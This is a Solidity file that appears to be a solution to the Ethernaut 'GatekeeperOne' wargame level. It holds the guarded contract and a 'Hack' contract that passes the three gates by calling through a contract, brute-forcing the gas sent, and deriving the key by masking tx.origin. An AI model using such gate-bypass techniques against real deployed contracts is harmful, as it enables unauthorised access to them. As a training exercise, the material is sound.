// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOne {

  address public entrant;
    //tx.origin is the account that initiated the transaction
    // to pass this, we call if from the hack contract.
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {
    event Entered(bool success);

    function enterGate(address _gateAddr) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint256 i = 0; i < 300; i++) {
          (bool success, ) = address(_gateAddr).call.gas(i + (8191 * 3))(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}